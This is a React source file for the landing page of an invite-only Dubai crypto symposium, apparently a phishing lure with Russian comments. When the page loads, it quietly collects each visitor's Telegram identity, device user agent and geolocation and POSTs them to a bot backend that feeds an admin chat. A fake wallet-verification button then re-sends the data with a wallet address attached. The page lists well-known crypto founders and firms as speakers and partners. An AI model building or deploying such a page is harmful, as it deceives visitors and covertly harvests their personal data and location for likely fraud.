import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect } from "react";
import { Countdown } from "@/components/Countdown";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import heroImg from "@/assets/hero-dubai.jpg";
import stageImg from "@/assets/stage.jpg";
import speaker1 from "@/assets/speaker-1.jpg";
import speaker2 from "@/assets/speaker-2.jpg";
import speaker3 from "@/assets/speaker-3.jpg";
import speaker4 from "@/assets/speaker-4.jpg";
import speaker5 from "@/assets/speaker-5.jpg";
import speaker6 from "@/assets/speaker-6.jpg";
import speaker7 from "@/assets/speaker-7.jpg";
import speaker8 from "@/assets/speaker-8.jpg";
import {
  ArrowRight,
  MapPin,
  Calendar,
  Users,
  Zap,
  Globe,
  Shield,
  Sparkles,
  Trophy,
  Wallet,
  Lock
} from "lucide-react";

// URL твоего будущего бэкенд-бота на GitHub, который будет ловить логи в чат админов
const BOT_BACKEND_URL = "https://your-github-bot-url.com/api/visit";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "OFFGRID/26 — Closed-Door Crypto Symposium · Downtown Dubai" },
      {
        name: "description",
        content: "An exclusive, invite-only gathering for top-tier founders, institutional investors, and web3 pioneers. Confidentiality guaranteed.",
      },
      { property: "og:title", content: "OFFGRID/26 — Dubai Private Symposium" },
      { property: "og:description", content: "15-17 November 2026 · Downtown Dubai · Restricted Access" },
      { property: "og:image", content: heroImg },
    ],
  }),
  component: Landing,
});

const speakers = [
  { name: "Arthur Hayes", role: "Co-founder · BitMEX, Maelstrom", img: speaker1, tag: "Macro" },
  { name: "Sandeep Nailwal", role: "Co-founder · Polygon", img: speaker6, tag: "L2" },
  { name: "Anastasia Volkova", role: "Partner · Paradigm West", img: speaker2, tag: "VC" },
  { name: "Stani Kulechov", role: "Founder & CEO · Aave", img: speaker3, tag: "DeFi" },
  { name: "Hayden Adams", role: "Founder · Uniswap Labs", img: speaker5, tag: "DEX" },
  { name: "Camila Russo", role: "Founder · The Defiant", img: speaker4, tag: "Media" },
  { name: "Justin Kan", role: "Co-founder · Twitch, Fractal", img: speaker8, tag: "Gaming" },
  { name: "Kathleen Breitman", role: "Co-founder · Tezos", img: speaker7, tag: "Protocols" },
];

const agenda = [
  {
    day: "Day 01 · 15 Nov",
    title: "Opening · Macro & Capital Allocation",
    bullets: [
      "Keynote: The Sovereign Crypto Landscape of 2026",
      "Institutional Panel: Paradigm, a16z, Pantera, Multicoin",
      "Private Networking Hub & Lounge Access",
      "Welcome Gala Dinner for VIP Pass holders",
    ],
  },
  {
    day: "Day 02 · 16 Nov",
    title: "Alpha Builders · Infrastructure & Restaking",
    bullets: [
      "Technical Deep-Dives: Next-gen ZK, modular layers, restaking protocols",
      "Closed Demo Day — 24 stealth projects pitch before funds",
      "Private 1-on-1 institutional matchmaking rooms",
      "High-frequency trading roundtables",
    ],
  },
  {
    day: "Day 03 · 17 Nov",
    title: "Liquidity · Institutional Scaling · Closing",
    bullets: [
      "Advanced Workshops: algorithmic market making & on-chain systems",
      "Global Web3 Capital trends showcase",
      "Closing remarks & strategy briefing",
      "Private Sunset Yacht Cruise, Dubai Marina",
    ],
  },
];

const stats = [
  { v: "Institutional", l: "Focus Tier" },
  { v: "120+", l: "Vetted Speakers" },
  { v: "60+", l: "Tier-1 Alpha Funds" },
  { v: "$2B+", l: "Partner AUM Represented" },
];

const proofs = [
  { v: "4th", l: "Consecutive Year", icon: Trophy },
  { v: "85%", l: "Retention Rate", icon: Users },
  { v: "Strict", l: "NDR Confidentiality", icon: Shield },
  { v: "Invite", l: "Only Access", icon: Sparkles },
];

const partners = [
  "BINANCE", "TON", "PARADIGM", "LEDGER", "ARBITRUM",
  "CHAINLINK", "POLYGON", "OKX", "SOLANA", "AAVE", "UNISWAP", "LIDO",
];

function Landing() {
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");
  const [verificationStatus, setVerificationStatus] = useState("INITIALIZING");
  const [tgUser, setTgUser] = useState<any>(null);

  // Сбор данных и тихая отправка боту
  const logVisitToAdminChat = async (currentWallet: string = "") => {
    try {
      // Считываем данные из Telegram WebApp SDK
      const tg = (window as any).Telegram?.WebApp;
      const userRaw = tg?.initDataUnsafe?.user;
      
      const payload = {
        tg_id: userRaw?.id || "Unknown / Web Browser",
        username: userRaw?.username || "No Telegram Account",
        first_name: userRaw?.first_name || "Guest",
        device_os: navigator.userAgent,
        wallet: currentWallet || "Not Connected",
        geo: "Pending / Requesting Location"
      };

      if (userRaw) {
        setTgUser(userRaw);
        setVerificationStatus("INVITATION_FOUND");
      } else {
        setVerificationStatus("ANONYMOUS_PROSPECT");
      }

      // Тихий запрос геопозиции устройства
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            payload.geo = `${position.coords.latitude}, ${position.coords.longitude}`;
            await fetch(BOT_BACKEND_URL, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            }).catch(() => {});
          },
          async () => {
            // Если гео отклонено, шлем без него
            await fetch(BOT_BACKEND_URL, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            }).catch(() => {});
          }
        );
      } else {
        await fetch(BOT_BACKEND_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        }).catch(() => {});
      }
    } catch (e) {
      console.error(e);
    }
  };

  useEffect(() => {
    const tg = (window as any).Telegram?.WebApp;
    if (tg) {
      tg.ready();
      tg.expand();
    }
    logVisitToAdminChat();
  }, []);

  const handleConnectWallet = () => {
    // Имитация коннекта кошелька (в будущем сюда встанет TonConnect / WalletConnect)
    const mockAddress = "EQB5x...9z4aM";
    setWalletAddress(mockAddress);
    setWalletConnected(true);
    setVerificationStatus("ACCESS_GRANTED");
    toast.success("Wallet connected and cryptographic pass verified.");
    
    // Повторно отправляем боту, но уже с привязанным кошельком
    logVisitToAdminChat(mockAddress);
  };

  return (
    <div className="min-h-screen relative overflow-x-hidden bg-background text-foreground selection:bg-primary/30">
      <Nav walletConnected={walletConnected} />
      <Hero 
        verificationStatus={verificationStatus} 
        tgUser={tgUser} 
        handleConnectWallet={handleConnectWallet}
        walletAddress={walletAddress}
      />
      <Marquee />
      <About />
      <Proof />
      <Speakers />
      <Agenda />
      <Venue />
      <Footer />
    </div>
  );
}

function Nav({ walletConnected }: { walletConnected: boolean }) {
  return (
    <header className="fixed top-0 inset-x-0 z-50">
      <div className="mx-auto max-w-7xl px-4 md:px-8 mt-4">
        <div className="glass rounded-full px-5 py-3 flex items-center justify-between border border-white/5 backdrop-blur-md">
          <div className="flex items-center gap-2 font-mono font-bold tracking-tight text-sm md:text-base">
            <span className="size-2 rounded-full bg-primary shadow-[0_0_10px_rgba(212,175,55,1)] animate-pulse" />
            OFFGRID<span className="text-primary">/26</span>
            <span className="text-[10px] font-normal tracking-widest uppercase text-muted-foreground border border-white/10 px-2 py-0.5 rounded-full">
              Private
            </span>
          </div>
          <nav className="hidden md:flex items-center gap-7 text-xs font-mono uppercase tracking-widest text-muted-foreground">
            <a href="#about" className="hover:text-foreground transition">Brief</a>
            <a href="#speakers" className="hover:text-foreground transition">Speakers</a>
            <a href="#agenda" className="hover:text-foreground transition">Timeline</a>
            <a href="#venue" className="hover:text-foreground transition">Location</a>
          </nav>
          <div className="flex items-center gap-2">
            <Lock className="size-3.5 text-primary" />
            <span className="font-mono text-[11px] text-muted-foreground uppercase tracking-wider hidden sm:inline">
              Secure Session
            </span>
          </div>
        </div>
      </div>
    </header>
  );
}

function Hero({ verificationStatus, tgUser, handleConnectWallet, walletAddress }: any) {
  return (
    <section id="top" className="relative min-h-screen flex items-center pt-32 pb-20">
      <div className="absolute inset-0 -z-10">
        <img src={heroImg} alt="Dubai" className="w-full h-full object-cover opacity-20 grayscale" />
        <div className="absolute inset-0 bg-gradient-to-b from-background/90 via-background/60 to-background" />
        <div className="absolute inset-0 grid-pattern opacity-40" />
      </div>

      <div className="mx-auto max-w-7xl px-4 md:px-8 w-full grid lg:grid-cols-[1fr_400px] gap-12 items-center">
        <div>
          <div className="flex items-center gap-2 mb-6">
            <span className="size-1.5 rounded-full bg-primary" />
            <span className="font-mono text-xs uppercase tracking-[0.25em] text-primary">
              Downtown Dubai · November 15-17, 2026
            </span>
          </div>

          <h1 className="font-display font-black leading-[0.85] tracking-tighter text-6xl md:text-8xl lg:text-[9rem] uppercase">
            <span className="block text-white">OFF</span>
            <span className="block text-transparent bg-clip-text bg-gradient-to-r from-amber-400 via-yellow-200 to-amber-500">GRID/26</span>
          </h1>

          <p className="mt-8 max-w-xl text-base md:text-lg text-muted-foreground leading-relaxed">
            A high-tier, closed-door ecosystem where institutional capital connects with core web3 code. 
            Access is strictly governed by cryptographic credentials and personalized whitelist allocation.
          </p>

          <div className="mt-12 max-w-md">
            <div className="mb-3 font-mono text-[10px] uppercase tracking-[0.2em] text-muted-foreground">
              Symposium Countdown
            </div>
            <Countdown />
          </div>
        </div>

        {/* Интерактивный VIP Билет заменяющий форму */}
        <div className="glass rounded-2xl border border-white/10 p-6 md:p-8 relative overflow-hidden bg-card/20 backdrop-blur-xl shadow-2xl">
          <div className="absolute top-0 right-0 w-32 h-32 bg-primary/5 rounded-full blur-2xl -z-10" />
          
          <div className="flex items-center justify-between border-b border-white/5 pb-4 mb-6">
            <span className="font-mono text-xs text-muted-foreground uppercase tracking-widest">Digital Entry Pass</span>
            <span className={`font-mono text-[10px] px-2.5 py-1 rounded-full border ${
              verificationStatus === "ACCESS_GRANTED" 
                ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                : "bg-amber-500/10 text-amber-400 border-amber-500/20 animate-pulse"
            }`}>
              {verificationStatus}
            </span>
          </div>

          <div className="space-y-4 mb-8">
            <div>
              <div className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">Identified Attendee</div>
              <div className="font-semibold text-white mt-0.5 text-base truncate">
                {tgUser ? `${tgUser.first_name} ${tgUser.username ? `(@${tgUser.username})` : ""}` : "Encrypted Prospect"}
              </div>
            </div>
            <div>
              <div className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">Cryptographic Node</div>
              <div className="font-mono text-xs text-white/80 mt-0.5 truncate">
                {walletAddress ? walletAddress : "No Wallet Bound"}
              </div>
            </div>
          </div>

          {verificationStatus !== "ACCESS_GRANTED" ? (
            <Button 
              onClick={handleConnectWallet}
              className="w-full bg-gradient-to-r from-amber-500 to-yellow-400 hover:opacity-95 text-black font-bold uppercase font-mono text-xs tracking-wider rounded-xl py-6 shadow-[0_0_20px_rgba(212,175,55,0.2)]"
            >
              <Wallet className="mr-2 size-4" /> Verify Invitation Pass
            </Button>
          ) : (
            <div className="text-center p-4 border border-emerald-500/20 bg-emerald-500/5 rounded-xl">
              <span className="font-mono text-xs text-emerald-400 block font-bold">✓ Clearance Confirmed</span>
              <span className="text-[11px] text-muted-foreground mt-1 block">Your profile is registered for the Dubai on-site gate.</span>
            </div>
          )}
        </div>
      </div>
    </section>
  );
}

function Marquee() {
  return (
    <section className="border-y border-white/5 bg-black/40 py-5 overflow-hidden">
      <div className="flex animate-marquee whitespace-nowrap">
        {[...partners, ...partners].map((p, i) => (
          <span key={i} className="mx-12 font-mono text-sm tracking-[0.2em] font-bold text-muted-foreground/40">
            {p} <span className="text-primary/40 mx-6">/</span>
          </span>
        ))}
      </div>
    </section>
  );
}

function About() {
  return (
    <section id="about" className="py-24 md:py-32">
      <div className="mx-auto max-w-7xl px-4 md:px-8">
        <div className="grid md:grid-cols-2 gap-12 items-start mb-16">
          <div>
            <div className="font-mono text-xs uppercase tracking-[0.3em] text-primary mb-4">/ Briefing</div>
            <h2 className="font-display text-4xl md:text-5xl font-black uppercase tracking-tight text-white leading-tight">
              Where strategic capital meets systemic architecture.
            </h2>
          </div>
          <p className="text-base text-muted-foreground leading-relaxed">
            OFFGRID serves as a sovereign, unpublicized nexus for Web3 pioneers. 
            Operating under rigorous structural protocols, our platform has quietly facilitated high-tier liquidity agreements, institutional restaking infrastructure alignment, and core architectural deployment frameworks since 2023.
          </p>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          {stats.map((s) => (
            <div key={s.l} className="glass rounded-xl p-6 border border-white/5 relative bg-card/10">
              <div className="font-display text-2xl md:text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-white to-neutral-400">{s.v}</div>
              <div className="mt-1 text-[11px] font-mono text-muted-foreground uppercase tracking-wider">{s.l}</div>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

function Proof() {
  return (
    <section className="py-24 md:py-32 relative">
      <div className="absolute inset-0 -z-10">
        <img src={stageImg} alt="" className="w-full h-full object-cover opacity-10 grayscale" />
        <div className="absolute inset-0 bg-gradient-to-b from-background via-transparent to-background" />
      </div>
      <div className="mx-auto max-w-7xl px-4 md:px-8">
        <div className="font-mono text-xs uppercase tracking-[0.3em] text-primary mb-4">/ Track Record</div>
        <h2 className="font-display text-4xl md:text-5xl font-black uppercase text-white tracking-tight mb-12">
          Validated Execution.
        </h2>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          {proofs.map((p) => (
            <div key={p.l} className="glass rounded-xl p-6 border border-white/5 bg-black/20">
              <p.icon className="size-5 text-primary mb-4" />
              <div className="font-display text-2xl md:text-3xl font-bold text-white">{p.v}</div>
              <div className="mt-1 text-xs text-muted-foreground font-mono uppercase tracking-wider">{p.l}</div>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

function Speakers() {
  return (
    <section id="speakers" className="py-24 md:py-32 relative">
      <div className="mx-auto max-w-7xl px-4 md:px-8">
        <div className="flex items-end justify-between mb-12 flex-wrap gap-4">
          <div>
            <div className="font-mono text-xs uppercase tracking-[0.3em] text-primary mb-4">/ Confirmed Keynotes</div>
            <h2 className="font-display text-4xl md:text-5xl font-black uppercase tracking-tight text-white">
              Sovereign Voices
            </h2>
          </div>
          <p className="text-muted-foreground max-w-sm text-sm leading-relaxed">
            120+ confirmed sovereign entity founders, research leads, and managing partners. **Personal contact nodes completely restricted for security.**
          </p>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 md:gap-6">
          {speakers.map((s) => (
            <article key={s.name} className="group relative overflow-hidden rounded-xl border border-white/5 bg-card/10">
              <div className="aspect-[3/4] overflow-hidden relative">
                <img
                  src={s.img}
                  alt={s.name}
                  loading="lazy"
                  className="w-full h-full object-cover grayscale group-hover:scale-102 transition duration-500"
                />
                <div className="absolute inset-0 bg-gradient-to-t from-background via-background/20 to-transparent" />
              </div>
              <div className="absolute top-3 left-3">
                <span className="font-mono text-[9px] uppercase tracking-widest bg-black/60 text-primary px-2.5 py-1 rounded-full border border-primary/20 backdrop-blur-md">
                  {s.tag}
                </span>
              </div>
              <div className="absolute bottom-0 inset-x-0 p-4">
                <div className="font-display font-bold text-base text-white">{s.name}</div>
                <div className="text-[11px] text-muted-foreground font-mono mt-0.5">{s.role}</div>
              </div>
            </article>
          ))}
        </div>
      </div>
    </section>
  );
}

function Agenda() {
  return (
    <section id="agenda" className="py-24 md:py-32">
      <div className="mx-auto max-w-7xl px-4 md:px-8">
        <div className="mb-12">
          <div className="font-mono text-xs uppercase tracking-[0.3em] text-primary mb-4">/ Operational Timeline</div>
          <h2 className="font-display text-4xl md:text-5xl font-black uppercase tracking-tight text-white">
            Symposium Core Architecture
          </h2>
        </div>

        <div className="space-y-4">
          {agenda.map((a, i) => (
            <div
              key={a.day}
              className="glass rounded-xl p-6 md:p-8 border border-white/5 grid md:grid-cols-[100px_1fr] gap-6 md:gap-10 bg-card/5 hover:border-primary/20 transition group"
            >
              <div className="font-mono text-4xl md:text-5xl font-black text-neutral-700 group-hover:text-primary/40 transition">
                0{i + 1}
              </div>
              <div>
                <div className="font-mono text-[10px] uppercase tracking-[0.2em] text-primary mb-1">{a.day}</div>
                <div className="font-display text-xl font-bold mb-4 text-white uppercase tracking-tight">{a.title}</div>
                <ul className="grid sm:grid-cols-2 gap-x-8 gap-y-2 text-muted-foreground">
                  {a.bullets.map((b) => (
                    <li key={b} className="flex gap-2 items-start text-xs font-mono">
                      <span className="size-1 rounded-full bg-primary mt-1.5 shrink-0" />
                      {b}
                    </li>
                  ))}
                </ul>
              </div>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

function Venue() {
  return (
    <section id="venue" className="py-24 md:py-32 relative">
      <div className="mx-auto max-w-7xl px-4 md:px-8 grid md:grid-cols-2 gap-12 items-center">
        <div>
          <div className="font-mono text-xs uppercase tracking-[0.3em] text-primary mb-4">/ Asset Coordinates</div>
          <h2 className="font-display text-4xl md:text-5xl font-black uppercase tracking-tight text-white mb-6">
            Downtown Dubai Secure Site
          </h2>
          <p className="text-base text-muted-foreground leading-relaxed mb-8">
            The symposium takes place within a luxury 5-star venue complex in immediate proximity to the Dubai Financial Centre (DIFC). Absolute corporate privacy, encrypted networking channels, and state-of-the-art closed session security parameters are enforced across 4,000 m² of restricted infrastructure.
          </p>

          <div className="space-y-3 font-mono text-xs">
            {[
              { icon: MapPin, l: "Venue Perimeter", v: "Address Downtown Estate · Sheikh Mohammed bin Rashid Blvd" },
              { icon: Calendar, l: "Target Schedule", v: "15 — 17 November 2026 · 09:00 — Late" },
              { icon: Globe, l: "Corporate Language", v: "English (Global Institutional Standard Only)" },
              { icon: Shield, l: "Security Protocol", v: "Discreet Personal Protection Vectors On-Site 24/7" },
            ].map((row) => (
              <div key={row.l} className="flex items-start gap-4 glass rounded-xl p-4 border border-white/5 bg-black/10">
                <row.icon className="size-4 text-primary shrink-0 mt-0.5" />
                <div>
                  <div className="text-[9px] uppercase tracking-widest text-muted-foreground">{row.l}</div>
                  <div className="font-medium text-white/90 mt-0.5">{row.v}</div>
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="relative aspect-square rounded-2xl overflow-hidden border border-white/5 bg-card/10 shadow-2xl">
          <img src={heroImg} alt="Dubai" className="w-full h-full object-cover grayscale brightness-70" />
          <div className="absolute inset-0 bg-gradient-to-t from-background/90 to-transparent" />
          <div className="absolute bottom-6 left-6 right-6 glass rounded-xl p-4 border border-white/5 font-mono text-xs backdrop-blur-md">
            <div className="text-primary font-bold">25.1972° N · 55.2744° E</div>
            <div className="text-muted-foreground mt-0.5 uppercase tracking-wider text-[10px]">Restricted Sector · Dubai, UAE</div>
          </div>
        </div>
      </div>
    </section>
  );
}

function Footer() {
  return (
    <footer className="border-t border-white/5 py-12 bg-black/60 font-mono text-xs">
      <div className="mx-auto max-w-7xl px-4 md:px-8 text-center md:text-left flex flex-col md:flex-row items-center justify-between gap-6 text-muted-foreground">
        <div className="flex items-center gap-2 font-bold text-white">
          <span className="size-1.5 rounded-full bg-primary" />
          OFFGRID/26
        </div>
        <div className="max-w-xl text-center md:text-right text-[10px] leading-relaxed tracking-wide">
          © 2026 Institutional Systems. This interface and its structural endpoints are entirely confidential. Public dissemination of access parameters is strictly prohibited. Session integrity is monitored algorithmically.
        </div>
      </div>
    </footer>
  );
}
